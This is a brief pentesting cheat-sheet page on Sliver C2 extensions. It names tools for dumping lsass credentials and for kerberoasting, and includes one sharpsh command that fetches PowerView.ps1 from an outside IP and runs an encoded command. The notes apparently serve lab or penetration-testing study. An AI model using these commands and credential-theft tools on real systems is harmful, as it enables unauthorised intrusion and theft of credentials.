| 🏠 [Home](../../pentesting.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

-   [Usefull Extensions](#usefull-extensions){#toc-usefull-extensions}
    -   [charpsh](#charpsh){#toc-charpsh}
    -   [inline-execute-assembly](#inline-execute-assembly){#toc-inline-execute-assembly}
    -   [Kerberos tools](#kerberos-tools){#toc-kerberos-tools}

# Usefull Extensions

-   handlekatz: dump lsass

-   mimikatz: what else

## charpsh

    sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZ???SNIP...

## inline-execute-assembly

[inline-execute-assembly](https://github.com/sliverarmory/InlineExecute-Assembly)

    inline-execute-assembly  <local_path_to_file> '<params>'

## Kerberos tools

-   `delegationbof`: enumerate kerberos delegations including kerberoast
    and asreproast

-   `c2tc-kerberoast`: kerberoasting an account (return an ticket that
    need to
    [TicketToHashcat.py](https://github.com/sliverarmory/C2-Tool-Collection/blob/main/BOF/Kerberoast/TicketToHashcat.py))

-   `bof-roast`: (return an ticket that need to
    [apreq2hashcat.py](https://github.com/sliverarmory/BofRoast/blob/main/BofRoast/apreq2hashcat.py))
